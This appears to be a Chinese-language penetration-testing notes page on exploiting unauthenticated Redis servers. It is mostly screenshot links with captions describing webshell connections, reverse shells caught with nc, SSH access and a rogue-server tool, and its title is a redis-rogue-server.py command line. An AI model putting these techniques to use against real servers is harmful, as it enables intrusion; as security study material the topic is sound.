---
title: python3 redis-rogue-server.py --rhost rhost --lhost lhost
...
![image-20210313153524089](/images/notes/数据库-Redis/images/1.png!small)

![image-20210313153649222](/images/notes/数据库-Redis/images/2.png!small)
...
![image-20210313153744277](/images/notes/数据库-Redis/images/3.png!small)
...
![image-20210313154006362](/images/notes/数据库-Redis/images/4.png!small)

## Redis 未授权访问漏洞

![20210127123450.png](/images/notes/数据库-Redis/images/5.png!small)
...
![image-20210313154418843](/images/notes/数据库-Redis/images/6.png!small)
...
![image-20210313142651072](/images/notes/数据库-Redis/images/7.png!small)
...
![image-20210313141156015](/images/notes/数据库-Redis/images/8.png!small)

蚁剑连接，连接成功：

![image-20210313141450001](/images/notes/数据库-Redis/images/9.png!small)
...
![image-20210313141527770](/images/notes/数据库-Redis/images/10.png!small)
...
![image-20210313141721882](/images/notes/数据库-Redis/images/11.png!small)
...
![image-20210313141849552](/images/notes/数据库-Redis/images/12.png!small)
...
![image-20210313142219306](/images/notes/数据库-Redis/images/13.png!small)
...
![image-20210313142253670](/images/notes/数据库-Redis/images/14.png!small)
...
![image-20210313142404801](/images/notes/数据库-Redis/images/15.png!small)

如下图所示，经过一分钟以后，在攻击机的nc中成功反弹shell回来：

![image-20210313142506224](/images/notes/数据库-Redis/images/16.png!small)
...
![image-20210313143209709](/images/notes/数据库-Redis/images/17.png!small)
...
![image-20210313144228255](/images/notes/数据库-Redis/images/18.png!small)

蚁剑连接成功：

![image-20210313144252316](/images/notes/数据库-Redis/images/19.png!small)
...
![image-20210313145334765](/images/notes/数据库-Redis/images/20.png!small)

如下图，ssh连接成功：

![image-20210313145405497](/images/notes/数据库-Redis/images/21.png!small)
...
![image-20210313152341252](/images/notes/数据库-Redis/images/22.png!small)
...
![image-20210313161535436](/images/notes/数据库-Redis/images/23.png!small)
...
![image-20210313160313409](/images/notes/数据库-Redis/images/24.png!small)

比如我们选择`i`来获得一个交互式的shell，执行在里面执行系统命令即可：

![image-20210313160440490](/images/notes/数据库-Redis/images/25.png!small)

也可以选择`r`来获得一个反弹shell：

![image-20210313160633235](/images/notes/数据库-Redis/images/26.png!small)
...
![image-20210313161950643](/images/notes/数据库-Redis/images/27.png!small)
...
![image-20210313162542274](/images/notes/数据库-Redis/images/28.png!small)

比如我们选择`i`来获得一个交互式的shell，执行在里面执行系统命令即可：

![image-20210313162635240](/images/notes/数据库-Redis/images/29.png!small)

也可以选择`r`来获得一个反弹shell：

![image-20210313162753237](/images/notes/数据库-Redis/images/30.png!small)
...
![image-20210313173003147](/images/notes/数据库-Redis/images/31.png!small)
...
![image-20210313175912560](/images/notes/数据库-Redis/images/32.png!small)
...
![image-20210313181513051](/images/notes/数据库-Redis/images/33.png!small)

![image-20210313180839852](/images/notes/数据库-Redis/images/34.png!small)

然后执行该脚本生成payload：

![image-20210313181926881](/images/notes/数据库-Redis/images/35.png!small)
...
![image-20210313183039481](/images/notes/数据库-Redis/images/36.png!small)

然后执行之前生成的payload：

![image-20210313183151478](/images/notes/数据库-Redis/images/37.png!small)
